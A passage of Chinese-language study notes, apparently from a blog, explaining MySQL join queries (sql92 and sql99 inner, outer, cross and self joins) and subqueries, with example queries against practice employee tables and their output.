class="line">| avg(salary)  | department_id | job_id     |</span><br><span class="line">+--------------+---------------+------------+</span><br><span class="line">| 24000.000000 |            90 | AD_PRES    |</span><br><span class="line">| 17000.000000 |            90 | AD_VP      |</span><br><span class="line">| 13000.000000 |            20 | MK_MAN     |</span><br><span class="line">| 100.000000 |            80 | SA_MAN     |</span><br></pre></td></tr></table></figure>

<h4 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h4><h5 id="多表连接"><a href="#多表连接" class="headerlink" title="多表连接"></a>多表连接</h5><h5 id="含义-又被称为多表查询，当查询的字段来自多个表时，就会用到连接查询"><a href="#含义-又被称为多表查询，当查询的字段来自多个表时，就会用到连接查询" class="headerlink" title="含义:又被称为多表查询，当查询的字段来自多个表时，就会用到连接查询"></a>含义:又被称为多表查询，当查询的字段来自多个表时，就会用到连接查询</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">笛卡尔乘积现象:表一 有m行，表2有n行，结果是&#x3D;m*n行</span><br><span class="line">发生原因:没有有效的连接条件</span><br><span class="line">如何避免:添加有效的连接条件</span><br><span class="line"></span><br><span class="line">分类:</span><br><span class="line">	按年代分类:</span><br><span class="line">	sql92标准:仅仅支持内连接</span><br><span class="line">	sql99标准(推荐):支持内连接+外连接(左外和右外)+交叉连接</span><br><span class="line">	</span><br><span class="line">	sql92:</span><br><span class="line">		内连接</span><br><span class="line">		</span><br><span class="line">	sql99:</span><br><span class="line">		内连接</span><br><span class="line">		外连接</span><br><span class="line">		交叉连接</span><br><span class="line">	</span><br><span class="line">	按功能分类:</span><br><span class="line">		内连接:</span><br><span class="line">			等值连接</span><br><span class="line">			非等值连接</span><br><span class="line">			自连接</span><br><span class="line">		外连接:</span><br><span class="line">			左外连接</span><br><span class="line">			右外连接</span><br><span class="line">			全外连接(MySQL不支持)			</span><br><span class="line">		交叉连接</span><br><span class="line"></span><br><span class="line">错误语法:select name,boyName from beauty,boys;</span><br><span class="line">笛卡尔集的错误情况:</span><br><span class="line">select count(*) from beauty;</span><br><span class="line">假设输出12行</span><br><span class="line">select count(*) from boys;</span><br><span class="line">假设输出4行</span><br><span class="line">最终结果:12*4&#x3D;48行</span><br><span class="line"></span><br><span class="line">正确语法</span><br><span class="line">select 表,表 from 库 where 表.字段&#x3D;表.字段;</span><br><span class="line"></span><br><span class="line">mysql&gt; select name,boyName from boys,beauty</span><br><span class="line">    -&gt; where 等值连接;</span><br><span class="line">    -&gt; 【and 筛选条件】</span><br><span class="line">    -&gt; 【group by 分组】</span><br><span class="line">    -&gt; 【having 分组后筛选】</span><br><span class="line">    -&gt; 【order by 排序字段】</span><br></pre></td></tr></table></figure>

<h5 id="一：sql92标准"><a href="#一：sql92标准" class="headerlink" title="一：sql92标准"></a>一：sql92标准</h5><h5 id="等值连接"><a href="#等值连接" class="headerlink" title="等值连接"></a>等值连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、等值连接</span><br><span class="line">①多表等值连接的结果多为表的交集部分</span><br><span class="line">②n表连接，最少需要n-1个连接条件</span><br><span class="line">③多表二的顺序没有要求</span><br><span class="line">④一般需要为表起别名</span><br><span class="line">⑤可以搭配前面的所有子句使用，比如排序、分组、筛选</span><br><span class="line"></span><br><span class="line">案例一:查询女神们和对应的男神名</span><br><span class="line">mysql&gt; select name,boyName</span><br><span class="line">    -&gt; from boys,beauty</span><br><span class="line">    -&gt; where beauty.boyfriend_id&#x3D;boys.id;</span><br><span class="line">    </span><br><span class="line">案例二:查询员工名和对应的部门名</span><br><span class="line">mysql&gt; select last_name,department_name</span><br><span class="line">    -&gt; from employees,departments</span><br><span class="line">    -&gt; where employees.department_id&#x3D;departments.department_id;</span><br><span class="line">    </span><br><span class="line">2、为表起别名</span><br><span class="line">好处:提高语句的简洁度，区分多个重名字段</span><br><span class="line">注意:如果为表起了别名，则查询的阻断就不能使用原来的表名去限定</span><br><span class="line"></span><br><span class="line">查询工种号、工种名、员工名</span><br><span class="line">mysql&gt; select last_name,e.job_id,job_title</span><br><span class="line">    -&gt; from employees e,jobs j</span><br><span class="line">    -&gt; where e.job_id&#x3D;j.job_id;</span><br><span class="line">    </span><br><span class="line">3、两个表的顺序是否可以调换</span><br><span class="line">查询工种号、工种名、员工名</span><br><span class="line">#可以</span><br><span class="line">mysql&gt; select last_name,e.job_id,job_title</span><br><span class="line">    -&gt; from e,jobs j，employees e</span><br><span class="line">    -&gt; where e.job_id&#x3D;j.job_id;</span><br><span class="line">    </span><br><span class="line">4、可以加筛选</span><br><span class="line">案例1:查询有奖金的员工名、部门名</span><br><span class="line">mysql&gt; select last_name,department_name,commission_pct</span><br><span class="line">    -&gt; from employees e,departments d</span><br><span class="line">    -&gt; where e.department_id&#x3D;d.department_id and e.commission_pct is not null;</span><br><span class="line">    </span><br><span class="line">案例2:查询城市名中第二个字符为o的部门名和城市名</span><br><span class="line">mysql&gt; select department_name,city</span><br><span class="line">    -&gt; from departments d,locations l</span><br><span class="line">    -&gt; where d.location_id&#x3D;l.location_id and city like &#39;_o%&#39;;</span><br><span class="line">+-----------------+---------------------+</span><br><span class="line">| department_name | city                |</span><br><span class="line">+-----------------+---------------------+</span><br><span class="line">| IT              | Southlake           |</span><br><span class="line">| Shi             | South San Francisco |</span><br><span class="line">| Mar             | Toronto             |</span><br><span class="line">| Hum             | London              |</span><br><span class="line">+-----------------+---------------------+</span><br><span class="line"></span><br><span class="line">5、可以加分组</span><br><span class="line">案例1:查询每个城市的部门个数</span><br><span class="line">mysql&gt; select count(*),city</span><br><span class="line">    -&gt; from departments d,locations l</span><br><span class="line">    -&gt; where d.location_id&#x3D;l.location_id</span><br><span class="line">    -&gt; group by city;</span><br><span class="line">+----------+---------------------+</span><br><span class="line">| count(*) | city                |</span><br><span class="line">+----------+---------------------+</span><br><span class="line">|        1 | London              |</span><br><span class="line">|        1 | Munich              |</span><br><span class="line">|        1 | Oxford              |</span><br><span class="line">|       21 | Seattle             |</span><br><span class="line">|        1 | South San Francisco |</span><br><span class="line">|        1 | Southlake           |</span><br><span class="line">|        1 | Toronto             |</span><br><span class="line">+----------+---------------------+</span><br><span class="line"></span><br><span class="line">案例2:查询有奖金的每个部门的部门名和部门的领导编号和该部门的最低工资</span><br><span class="line">mysql&gt; select min(salary),department_name,d.manager_id</span><br><span class="line">    -&gt; from employees e,departments d</span><br><span class="line">    -&gt; where e.department_id&#x3D;d.department_id and commission_pct is not null</span><br><span class="line">    -&gt; group by department_name,d.manager_id;</span><br><span class="line">+-------------+-----------------+------------+</span><br><span class="line">| min(salary) | department_name | manager_id |</span><br><span class="line">+-------------+-----------------+------------+</span><br><span class="line">|     6100.00 | Sal             |        145 |</span><br><span class="line">+-------------+-----------------+------------+</span><br><span class="line"></span><br><span class="line">6、可以加排序</span><br><span class="line">mysql&gt; select job_title,count(*)</span><br><span class="line">    -&gt; from jobs j,employees e</span><br><span class="line">    -&gt; where j.job_id&#x3D;e.job_id</span><br><span class="line">    -&gt; group by job_title</span><br><span class="line">    -&gt; order by count(*) desc;</span><br><span class="line">+---------------------------------+----------+</span><br><span class="line">| job_title                       | count(*) |</span><br><span class="line">+---------------------------------+----------+</span><br><span class="line">| Sales Representative            |       30 |</span><br><span class="line">| Shipping Clerk                  |       20 |</span><br><span class="line">| Stock Clerk                     |       20 |</span><br><span class="line">| Purchasing Clerk                |        5 |</span><br><span class="line"></span><br><span class="line">7、可以实现三表连接</span><br><span class="line">案例:查询员工名、部门名和所在城市</span><br><span class="line">mysql&gt; select last_name,department_name,city</span><br><span class="line">    -&gt; from employees e,departments d,locations l</span><br><span class="line">    -&gt; where d.department_id&#x3D;e.department_id and d.location_id&#x3D;l.location_id;</span><br></pre></td></tr></table></figure>

<h5 id="非等值连接"><a href="#非等值连接" class="headerlink" title="非等值连接"></a>非等值连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	mysql&gt; select name,boyName from boys,beauty</span><br><span class="line">    -&gt; where 非等值连接;</span><br><span class="line">    -&gt; 【and 筛选条件】</span><br><span class="line">    -&gt; 【group by 分组】</span><br><span class="line">    -&gt; 【having 分组后筛选】</span><br><span class="line">    -&gt; 【order by 排序字段】</span><br><span class="line"></span><br><span class="line">案例1:查询员工的工资和工资级别，并进行排序</span><br><span class="line">mysql&gt; select salary,grade_level</span><br><span class="line">    -&gt; from employees e,job_grades g</span><br><span class="line">    -&gt; where salary between g.lowest_sal and g.highest_sal</span><br><span class="line">    -&gt; order by grade_level desc;</span><br><span class="line">+----------+-------------+</span><br><span class="line">| salary   | grade_level |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| 24000.00 | E           |</span><br><span class="line">| 17000.00 | E           |</span><br><span class="line">| 17000.00 | E           |</span><br></pre></td></tr></table></figure>

<h5 id="自连接"><a href="#自连接" class="headerlink" title="自连接"></a>自连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	mysql&gt; select name,boyName from boys,beauty</span><br><span class="line">	-&gt; from 表 别名1,表 别名2</span><br><span class="line">    -&gt; where 等值;</span><br><span class="line">    -&gt; 【and 筛选条件】</span><br><span class="line">    -&gt; 【group by 分组】</span><br><span class="line">    -&gt; 【having 分组后筛选】</span><br><span class="line">    -&gt; 【order by 排序字段】</span><br><span class="line"></span><br><span class="line">案例:查询员工名和上级名称</span><br><span class="line">mysql&gt; select e.employee_id,e.last_name,m.employee_id,m.last_name</span><br><span class="line">    -&gt; from employees e,employees m</span><br><span class="line">    -&gt; where e.employee_id&#x3D;m.manager_id;</span><br><span class="line">+-------------+-----------+-------------+-------------+</span><br><span class="line">| employee_id | last_name | employee_id | last_name   |</span><br><span class="line">+-------------+-----------+-------------+-------------+</span><br><span class="line">|         100 | K_ing     |         101 | Kochhar     |</span><br><span class="line">|         100 | K_ing     |         102 | De Haan     |</span><br><span class="line">|         102 | De Haan   |         103 | Hunold      |</span><br><span class="line">|         103 | Hunold    |         104 | Ernst       |</span><br><span class="line">|         103 | Hunold    |         105 | Austin      |</span><br><span class="line">|         103 | Hunold    |         106 | Pataballa   |</span><br></pre></td></tr></table></figure>

<h5 id="二、sql99语法"><a href="#二、sql99语法" class="headerlink" title="二、sql99语法"></a>二、sql99语法</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	select 查询列表 </span><br><span class="line">	from 表1 别名</span><br><span class="line">	【join】 表2 别名 on 连接条件</span><br><span class="line">	【where 筛选条件】</span><br><span class="line">	【group by 分组】</span><br><span class="line">	【having 筛选条件】</span><br><span class="line">	【order by 排序】</span><br><span class="line">	</span><br><span class="line">分类:</span><br><span class="line">#以下英文标识连接条件，方括号中可加可不加</span><br><span class="line">内连接:inner</span><br><span class="line">外连接</span><br><span class="line">	左外:left 【outer】</span><br><span class="line">	右外:right 【outer】</span><br><span class="line">	全外:full 【outer】</span><br><span class="line">交叉连接:cross</span><br><span class="line"></span><br><span class="line">内连接:</span><br><span class="line">	A表和B表能够完全匹配的记录查询出来，被称为内连接</span><br><span class="line">外连接:</span><br><span class="line">	A表和B表能够完全匹配的记录查询出来之外，将其中一张表的记录无条件的查询出来对方表没有匹配的记录会自动显示null与之匹配，这种查询被称为外连接。</span><br><span class="line">	外连接的查询结果条数 &gt;&#x3D; 内连接的查询结果条数</span><br></pre></td></tr></table></figure>

<h5 id="一、内连接"><a href="#一、内连接" class="headerlink" title="一、内连接"></a>一、内连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 查询列表</span><br><span class="line">from 表1 别名</span><br><span class="line">inner join 表2 别名</span><br><span class="line">on 连接条件;</span><br><span class="line"></span><br><span class="line">內连分类:</span><br><span class="line">	等值连接</span><br><span class="line">	非等值连接</span><br><span class="line">	自连接</span><br><span class="line">	</span><br><span class="line">特点1:</span><br><span class="line">	①添加排序、分组、筛选</span><br><span class="line">	②inner可以省略</span><br><span class="line">	③筛选条件放在where后面，连接条件放在on的后面，提高了分离性，便于阅读</span><br><span class="line">	④inner join连接和sql92语法中的等值连接效果是一样的，都是查询多表的交集</span><br><span class="line">特点2:</span><br><span class="line">	①表的顺序调换</span><br><span class="line">	②内连接的结果&#x3D;多表的交集</span><br><span class="line">	③n表连接至少需要n-1个连接条件</span><br></pre></td></tr></table></figure>

<h5 id="1、等值连接"><a href="#1、等值连接" class="headerlink" title="1、等值连接"></a>1、等值连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例一:查询员工名、部门名</span><br><span class="line">mysql&gt; select last_name,department_name</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; inner join departments d</span><br><span class="line">    -&gt; on e.department_id&#x3D;d.department_id;</span><br><span class="line">    </span><br><span class="line">案例二:查询名字中包含e的员工名和工种名（筛选）</span><br><span class="line">mysql&gt; select last_name,job_title</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; inner join jobs j</span><br><span class="line">    -&gt; on e.job_id&#x3D;j.job_id</span><br><span class="line">    -&gt; where e.last_name like &#39;%e%&#39;;</span><br><span class="line">    </span><br><span class="line">案例三:查询部门个数&gt;3的城市名和部门个数（分组+筛选）</span><br><span class="line">mysql&gt; select city,count(*)</span><br><span class="line">    -&gt; from departments d</span><br><span class="line">    -&gt; inner join locations l</span><br><span class="line">    -&gt; on d.location_id&#x3D;l.location_id</span><br><span class="line">    -&gt; group by city</span><br><span class="line">    -&gt; having count(*)&gt;3;</span><br><span class="line">    </span><br><span class="line">案例四:查询部门的员工个数&gt;3的城市名和部门个数，并按个数降序（分组+筛选+排序）</span><br><span class="line">mysql&gt; select count(*),department_id</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; group by department_id</span><br><span class="line">    -&gt; having count(*)&gt;3</span><br><span class="line">    -&gt; order by count(*) desc;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">三表连接</span><br><span class="line">语法格式:</span><br><span class="line">select 查询条件</span><br><span class="line">from 表1 别名</span><br><span class="line">【inner】join 表2 别名 on 表1&#x3D;表3  #等值连接</span><br><span class="line">【inner】join 表3 别名 on 表1&#x3D;表3	#等值连接</span><br><span class="line"></span><br><span class="line">案例五:查询员工名、部门名、工种名，并按部门名降序()</span><br><span class="line"></span><br><span class="line">#进行多面连接时候，先from后面的表和第一个join的表连接</span><br><span class="line">然后再将from后面的表和第二个join表连接</span><br><span class="line">mysql&gt; select last_name,department_name,job_title</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; inner join departments d on e.department_id&#x3D;d.department_id</span><br><span class="line">    -&gt; inner join jobs j on e.job_id&#x3D;j.job_id</span><br><span class="line">    -&gt; order by department_name desc;</span><br></pre></td></tr></table></figure>



<h5 id="2、非等值连接"><a href="#2、非等值连接" class="headerlink" title="2、非等值连接"></a>2、非等值连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询员工的工资级别</span><br><span class="line">mysql&gt; select salary,grade_level</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; inner join job_grades g</span><br><span class="line">    -&gt; on e.salary between g.lowest_sal and g.highest_sal;</span><br><span class="line">    </span><br><span class="line">查询每个工资级别的个数&gt;20的个数，并且按工资级别排序</span><br><span class="line">mysql&gt; select count(*),grade_level</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; join job_grades g</span><br><span class="line">    -&gt; on e.salary between g.lowest_sal and g.highest_sal</span><br><span class="line">    -&gt; group by grade_level</span><br><span class="line">    -&gt; having count(*)&gt;20</span><br><span class="line">    -&gt; order by count(*) desc;</span><br></pre></td></tr></table></figure>

<h5 id="3、自连接"><a href="#3、自连接" class="headerlink" title="3、自连接"></a>3、自连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select e.last_name,m.last_name</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; inner join employees m</span><br><span class="line">    -&gt; on e.manager_id&#x3D;m.employee_id;</span><br></pre></td></tr></table></figure>

<h5 id="二、外连接"><a href="#二、外连接" class="headerlink" title="二、外连接"></a>二、外连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">为什么inner和outer可以省略，加上去有什么好处?</span><br><span class="line"> - 可以省略，因为区分内连接和外连接的依靠的不是这些关键字而是left&#x2F;right若存在，表示一定是一个外连接，其他都是内连接</span><br><span class="line"> - 加上去的好处是增强可读性</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	select 查询列表 </span><br><span class="line">	from 表1 别名</span><br><span class="line">	left|right|full【outer】 表2 别名 on 连接条件		#其中任意一个都可以</span><br><span class="line">	【where 筛选条件】</span><br><span class="line">	【group by 分组】</span><br><span class="line">	【having 筛选条件】</span><br><span class="line">	【order by 排序】</span><br><span class="line"></span><br><span class="line">特点:</span><br><span class="line">1、外链接的查询结果为主要表中的所有行</span><br><span class="line">		如果从表中有和它匹配的，则显示匹配的行</span><br><span class="line">		如果从表中没有和它匹配的则显示null</span><br><span class="line">	外连接查询结果&#x3D;内连接结果+主表中有而从表中没有的记录</span><br><span class="line">2、左外连接，left join左边的是主表</span><br><span class="line">   右外连接, right join右边的是主表</span><br><span class="line">3、左外和右外交换两个表的顺序，可以实现同样的效果</span><br><span class="line">4、一般用于查询除了交集部分的剩余的不匹配的行</span><br><span class="line"></span><br><span class="line">引入:查询男朋友不在男神表的女神名</span><br><span class="line">左外连接</span><br><span class="line">mysql&gt; select b.name,bo.*</span><br><span class="line">    -&gt; from beauty b</span><br><span class="line">    -&gt; left outer join boys bo</span><br><span class="line">    -&gt; on b.boyfriend_id &#x3D; bo.id</span><br><span class="line">    -&gt; where bo.id is null</span><br><span class="line">    </span><br><span class="line">右外连接</span><br><span class="line">mysql&gt; select b.name,bo.*</span><br><span class="line">    -&gt; from boys bo</span><br><span class="line">    -&gt; right outer joinbeauty b</span><br><span class="line">    -&gt; on b.boyfriend_id &#x3D; bo.id</span><br><span class="line">    -&gt; where b.id is null    </span><br><span class="line">    </span><br><span class="line">案例一:查询那个部门没有员工</span><br><span class="line">左外连接</span><br><span class="line">mysql&gt; select d.*,e.employee_id</span><br><span class="line">    -&gt; from departments d</span><br><span class="line">    -&gt; left outer join employees e</span><br><span class="line">    -&gt; on d.department_id&#x3D;e.department_id</span><br><span class="line">    -&gt; where e.employee_id is null;</span><br><span class="line">    </span><br><span class="line">右外连接</span><br><span class="line">mysql&gt; select d.*,e.employee_id</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; right outer join departments d</span><br><span class="line">    -&gt; on d.department_id&#x3D;e.department_id</span><br><span class="line">    -&gt; where e.employee_id is null;</span><br></pre></td></tr></table></figure>

<h5 id="交叉连接"><a href="#交叉连接" class="headerlink" title="交叉连接"></a>交叉连接</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	select 查询列表</span><br><span class="line">	from 表1 别名</span><br><span class="line">	cross join 表2 别名;</span><br><span class="line"></span><br><span class="line">特点:类似于笛卡尔乘积</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select b.*,bo.*</span><br><span class="line">    -&gt; from beauty b</span><br><span class="line">    -&gt; cross join boys bo;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sql92和sql99</span><br><span class="line">功能:sql99支持的较多</span><br><span class="line">可读性:sql99实现连接条件和筛选条件的分离，可读性较高</span><br></pre></td></tr></table></figure>

<h5 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">含义:</span><br><span class="line">出现在其他语句中的select语句，成为子查询或内查询</span><br><span class="line">外部如果shiselect语句，则此语句成为主查询或外查询</span><br><span class="line"></span><br><span class="line">分类:</span><br><span class="line">按子查询出现的位置</span><br><span class="line">可以放在</span><br><span class="line">	select后面:</span><br><span class="line">		仅仅支持标量子查询 #select后面只能放标量子查询</span><br><span class="line">	from后面:</span><br><span class="line">		支持表子查询</span><br><span class="line">	where或having后面: ★  	#这三个重点</span><br><span class="line">		标量子查询	   ★</span><br><span class="line">		列子查询	    ★</span><br><span class="line">		行子查询 #用的较少</span><br><span class="line">	exists后面</span><br><span class="line">		标量子查询</span><br><span class="line">		列子查询</span><br><span class="line">		行子查询</span><br><span class="line">按结果集的行列数不同:</span><br><span class="line">	标量子查询(结果集只有一行一列)</span><br><span class="line">	列子查询(结果集只有一列多行)</span><br><span class="line">	行子查询(结果集有多行多列)</span><br><span class="line">	表子查询(结果集，一般为多行多列)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">示例:</span><br><span class="line">where或having</span><br><span class="line">1、标量子查询</span><br><span class="line">	select first_name from employees </span><br><span class="line">	where department_id in(</span><br><span class="line">	select department_id from departments</span><br><span class="line">	where location_id&#x3D;1700</span><br><span class="line">	)</span><br></pre></td></tr></table></figure>



<h5 id="一、where或having后面"><a href="#一、where或having后面" class="headerlink" title="一、where或having后面"></a>一、where或having后面</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、标量子查询(单行子查询)</span><br><span class="line">2、列子查询(多行子查询)</span><br><span class="line">3、行子查询(多列多行)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">特点:</span><br><span class="line">①子查询放在小括号内</span><br><span class="line">②子查询一般放在条件的右侧</span><br><span class="line">③标量子查询，一般搭配着单行操作符使用 #单行操作符就是条件运算符</span><br><span class="line">&gt; &lt; &gt;&#x3D; &lt;&#x3D; &#x3D; &lt;&gt;</span><br><span class="line">列子查询，一般搭配着多行操作符使用</span><br><span class="line">in、any&#x2F;some、all</span><br><span class="line">④子查询的执行优先于主查询执行，主查询的条件用到了子查询的结果</span><br></pre></td></tr></table></figure>

<h5 id="1、标量子查询"><a href="#1、标量子查询" class="headerlink" title="1、标量子查询"></a>1、标量子查询</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 子查询就是select语句嵌套select语句</span><br><span class="line"> </span><br><span class="line"> 子查询可以出现在:</span><br><span class="line"> 	select..(select).	#可以出现在select后面</span><br><span class="line"> 	from ..(select).	#可以出现在from后面</span><br><span class="line"> 	where ..(select).	#可以出现where后面</span><br><span class="line"> 格式:</span><br><span class="line"> 	select 字段 from 表名 </span><br><span class="line"> 	where 筛选条件(查询条件)</span><br><span class="line"></span><br><span class="line">where后面使用子查询</span><br><span class="line"></span><br><span class="line">案例1:谁的工资比Abel高</span><br><span class="line">①：先找出谁的名字叫Abel</span><br><span class="line">select salary from employees</span><br><span class="line">    -&gt; where last_name&#x3D;&#39;Abel&#39;;</span><br><span class="line">②再将他们的工资比较</span><br><span class="line"> mysql&gt; select * from employees</span><br><span class="line">    -&gt; where salary&gt;(select salary from employees</span><br><span class="line">    -&gt; where last_name&#x3D;&#39;Abel&#39;);</span><br><span class="line">    </span><br><span class="line">案例2::返回job_id与141号员工相同，salary比143号员工多的员工 姓名，job_id和工资</span><br><span class="line">mysql&gt; select job_id,last_name,salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where job_id &#x3D; (select job_id from employees</span><br><span class="line">    -&gt; where employee_id &#x3D; 141) and</span><br><span class="line">    -&gt; salary&gt;(select salary from employees</span><br><span class="line">    -&gt; where employee_id&#x3D;143);</span><br><span class="line">+----------+-------------+---------+</span><br><span class="line">| job_id   | last_name   | salary  |</span><br><span class="line">+----------+-------------+---------+</span><br><span class="line">| ST_CLERK | Nayer       | 3200.00 |</span><br><span class="line">| ST_CLERK | Mikkilineni | 2700.00 |</span><br><span class="line">| ST_CLERK | Bissot      | 3300.00 |</span><br><span class="line">| ST_CLERK | Atkinson    | 2800.00 |</span><br><span class="line">| ST_CLERK | Mallin      | 3300.00 |</span><br><span class="line">| ST_CLERK | Rogers      | 2900.00 |</span><br><span class="line">| ST_CLERK | Ladwig      | 3600.00 |</span><br><span class="line">| ST_CLERK | Stiles      | 3200.00 |</span><br><span class="line">| ST_CLERK | Seo         | 2700.00 |</span><br><span class="line">| ST_CLERK | Rajs        | 3500.00 |</span><br><span class="line">| ST_CLERK | Davies      | 3100.00 |</span><br><span class="line">+----------+-------------+---------+</span><br><span class="line">11 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">案例3:返回公司工资最少的员工的last_name,job_id和salary</span><br><span class="line">mysql&gt; select salary,last_name,job_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where salary&#x3D;(select min(salary) from employees);</span><br><span class="line"></span><br><span class="line">having后面</span><br><span class="line">案例4:查询最低工资大于50号部门最低工资的部门id和其最低工资</span><br><span class="line">mysql&gt; select min(salary),department_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id</span><br><span class="line">    -&gt; having min(salary)&gt;(select min(salary)</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where department_id&#x3D;50);</span><br><span class="line">    </span><br><span class="line">注意:非法使用标量子查询也就是说子查询的结果不是一行一列</span><br></pre></td></tr></table></figure>

<h5 id="2、列子查询（多行子查询）"><a href="#2、列子查询（多行子查询）" class="headerlink" title="2、列子查询（多行子查询）"></a>2、列子查询（多行子查询）</h5><ul>
<li><h5 id="多行子查询操作符"><a href="#多行子查询操作符" class="headerlink" title="多行子查询操作符"></a>多行子查询操作符</h5></li>
</ul>
<table>
<thead>
<tr>
<th>操作符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>in/not in</td>
<td>等于列表中的任意一个</td>
</tr>
<tr>
<td>any | some</td>
<td>和子查询返回的某一个值比较</td>
</tr>
<tr>
<td>all</td>
<td>和子查询返回的所有值比较</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例1:返回location_id是1400或1700的部门中所有员工姓名</span><br><span class="line">mysql&gt; select last_name</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where department_id in (select department_id from departments</span><br><span class="line">    -&gt; where location_id in(1400,1700));</span><br><span class="line">+------------+</span><br><span class="line">| last_name  |</span><br><span class="line">+------------+</span><br><span class="line">| K_ing      |</span><br><span class="line">| Kochhar    |</span><br><span class="line">| De Haan    |</span><br><span class="line">| Hunold     |</span><br><span class="line"></span><br><span class="line">案例2:返回其他部门中比job_id为&#39;IT_PROG&#39;部门任一工资低的员工的员工号、姓名、job_id以及salary</span><br><span class="line">①查询job_id为&#39;IT_PROG&#39;部门</span><br><span class="line">mysql&gt; select salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where job_id &#x3D; &#39;IT_PROG&#39;;</span><br><span class="line">②查询员工号、姓名、job_id以及salary，salary&lt;(①)的任意一个</span><br><span class="line">mysql&gt; select last_name,employee_id,job_id,salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where salary&lt;any(select salary from employees where job_id&#x3D;&#39;IT_PROG&#39;);</span><br><span class="line">或</span><br><span class="line">mysql&gt; select last_name,employee_id,job_id,salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">#小于any也就是比子查询里的都小，也就是小于最大的，就可以改成max(salary)，外面就不需要any了</span><br><span class="line">    -&gt; where salary&lt;(select max(salary) from employees where job_id&#x3D;&#39;IT_PROG&#39;);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">案例3:返回其他部门中比job_id为&#39;IT_PROG&#39;部门所有工资都低的员工的员工号、姓名、job_id以及salary</span><br><span class="line">①查询job_id为&#39;IT_PROG&#39;部门</span><br><span class="line">mysql&gt; select salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where job_id &#x3D; &#39;IT_PROG&#39;;</span><br><span class="line">②查询员工号、姓名、job_id以及salary，salary&lt;(①)的全部</span><br><span class="line">mysql&gt; select employee_id,last_name,job_id,salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where salary&lt;all(select salary from employees</span><br><span class="line">    -&gt; where job_id&#x3D;&#39;IT_PROG&#39;) and job_id&lt;&gt;&#39;IT_PROG&#39;;</span><br><span class="line">或</span><br><span class="line">mysql&gt; select employee_id,last_name,job_id,salary</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where salary&lt;(select max(salary) from employees</span><br><span class="line">    -&gt; where job_id&#x3D;&#39;IT_PROG&#39;) and job_id&lt;&gt;&#39;IT_PROG&#39;;</span><br></pre></td></tr></table></figure>

<h5 id="3、行子查询（结果集一行多列或多行多列）"><a href="#3、行子查询（结果集一行多列或多行多列）" class="headerlink" title="3、行子查询（结果集一行多列或多行多列）"></a>3、行子查询（结果集一行多列或多行多列）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">行子查询（了解）  #有局限性，不常用</span><br><span class="line">案例:查询员工编号最小并且工资最高的员工</span><br><span class="line">mysql&gt; select *</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where (employee_id,salary)&#x3D;(</span><br><span class="line">    -&gt; select min(employee_id),max(salary)</span><br><span class="line">    -&gt; from employees);</span><br></pre></td></tr></table></figure>

